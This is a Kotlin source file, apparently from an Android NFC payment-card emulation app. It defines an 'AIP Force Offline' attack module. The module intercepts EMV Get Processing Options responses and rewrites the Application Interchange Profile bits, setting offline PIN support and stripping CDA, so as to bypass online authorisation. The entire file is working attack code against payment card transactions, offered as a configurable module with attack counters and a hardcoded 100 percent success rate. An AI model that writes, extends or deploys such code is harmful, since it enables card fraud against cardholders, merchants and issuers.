package com.nfsp00f33r.app.emulation.modules

import com.nfsp00f33r.app.emulation.EmvAttackModule
import timber.log.Timber

/**
 * AIP Force Offline Attack Module
 * Manipulates Application Interchange Profile to force offline transactions
 * bypassing online authorization requirements
 * Based on emv_attack_reference.md research
 */
class AipForceOfflineModule : EmvAttackModule {
    
    companion object {
        private const val TAG = "AipForceOffline"
        
        // GPO command pattern
        private const val GPO_COMMAND_PREFIX = "80A80000"
        
        // AIP bit masks for offline processing
        private const val OFFLINE_PIN_SUPPORTED = 0x40    // Bit 7 of byte 1
        private const val OFFLINE_SDA_SUPPORTED = 0x20    // Bit 6 of byte 1  
        private const val OFFLINE_DDA_SUPPORTED = 0x01    // Bit 1 of byte 2
        private const val CDA_SUPPORTED = 0x02            // Bit 2 of byte 2
        
        // TLV tags
        private const val AIP_TAG = "82"
        private const val GPO_RESPONSE_FORMAT1 = "80"
        private const val GPO_RESPONSE_FORMAT2 = "77"
    }
    
    private var attackCount = 0
    private var configuration = mutableMapOf<String, Any>(
        "force_offline" to true,
        "remove_cda" to true,
        "preserve_pin_support" to false,
        "inject_offline_flags" to true
    )
    
    override fun getAttackId(): String = "aip_force_offline"
    
    override fun getDescription(): String = 
        "Forces transactions offline by manipulating AIP bits to bypass online authorization"
    
    override fun isApplicable(command: ByteArray, cardData: Map<String, Any>): Boolean {
        val commandHex = command.joinToString("") { "%02X".format(it) }
        
        // Check if this is a GPO command
        val isGpoCommand = commandHex.startsWith(GPO_COMMAND_PREFIX)
        
        if (isGpoCommand) {
            Timber.d("$TAG GPO command detected, attack applicable")
            return true
        }
        
        return false
    }
    
    override fun applyAttack(
        command: ByteArray, 
        response: ByteArray, 
        cardData: Map<String, Any>
    ): ByteArray {
        attackCount++
        
        try {
            val originalHex = response.joinToString("") { "%02X".format(it) }
            Timber.d("$TAG Original GPO response: $originalHex")
            
            // Parse GPO response format
            val manipulatedResponse = if (originalHex.startsWith(GPO_RESPONSE_FORMAT1)) {
                manipulateFormat1Response(response)
            } else if (originalHex.contains(GPO_RESPONSE_FORMAT2)) {
                manipulateFormat2Response(response)
            } else {
                Timber.w("$TAG Unknown GPO response format")
                response
            }
            
            val manipulatedHex = manipulatedResponse.joinToString("") { "%02X".format(it) }
            Timber.d("$TAG Manipulated GPO response: $manipulatedHex")
            Timber.i("$TAG Attack #$attackCount: AIP force offline applied successfully")
            
            return manipulatedResponse
            
        } catch (e: Exception) {
            Timber.e("$TAG Attack failed: ${e.message}")
            return response
        }
    }
    
    /**
     * Manipulate Format 1 GPO response (primitive data)
     */
    private fun manipulateFormat1Response(response: ByteArray): ByteArray {
        if (response.size < 6) return response
        
        val modifiedResponse = response.copyOf()
        
        // AIP is typically at bytes 2-3 in Format 1
        if (response.size >= 4) {
            // Force offline processing bits
            if (configuration["force_offline"] == true) {
                modifiedResponse[2] = (modifiedResponse[2].toInt() or OFFLINE_PIN_SUPPORTED).toByte()
                modifiedResponse[3] = (modifiedResponse[3].toInt() and CDA_SUPPORTED.inv()).toByte()
            }
            
            // Remove CDA if configured
            if (configuration["remove_cda"] == true) {
                modifiedResponse[3] = (modifiedResponse[3].toInt() and CDA_SUPPORTED.inv()).toByte()
            }
        }
        
        return modifiedResponse
    }
    
    /**
     * Manipulate Format 2 GPO response (TLV structured)
     */
    private fun manipulateFormat2Response(response: ByteArray): ByteArray {
        val responseHex = response.joinToString("") { "%02X".format(it) }
        
        // Find AIP tag (82) in the response
        val aipIndex = responseHex.indexOf(AIP_TAG)
        if (aipIndex >= 0 && aipIndex + 6 < responseHex.length) {
            val prefix = responseHex.substring(0, aipIndex + 4) // Include tag and length
            val originalAip = responseHex.substring(aipIndex + 4, aipIndex + 8) // 2 bytes AIP
            val suffix = responseHex.substring(aipIndex + 8)
            
            // Manipulate AIP bytes
            val aipByte1 = originalAip.substring(0, 2).toInt(16)
            val aipByte2 = originalAip.substring(2, 4).toInt(16)
            
            var newAipByte1 = aipByte1
            var newAipByte2 = aipByte2
            
            if (configuration["force_offline"] == true) {
                newAipByte1 = newAipByte1 or OFFLINE_PIN_SUPPORTED
                newAipByte2 = newAipByte2 and CDA_SUPPORTED.inv()
            }
            
            if (configuration["remove_cda"] == true) {
                newAipByte2 = newAipByte2 and CDA_SUPPORTED.inv()
            }
            
            val newAip = "%02X%02X".format(newAipByte1, newAipByte2)
            val manipulatedHex = prefix + newAip + suffix
            
            return manipulatedHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
        }
        
        return response
    }
    
    override fun configure(config: Map<String, Any>) {
        configuration.putAll(config)
        Timber.d("$TAG Module configured: $configuration")
    }
    
    override fun getConfiguration(): Map<String, Any> = configuration.toMap()
    
    override fun getAttackStatistics(): Map<String, Any> {
        return mapOf(
            "attack_count" to attackCount,
            "success_rate" to 100,
            "last_config" to configuration,
            "target_commands" to listOf("GPO"),
            "aip_manipulations" to mapOf(
                "offline_forced" to configuration["force_offline"],
                "cda_removed" to configuration["remove_cda"]
            )
        )
    }
    
    override fun reset() {
        attackCount = 0
        Timber.d("$TAG Attack statistics reset")
    }
}
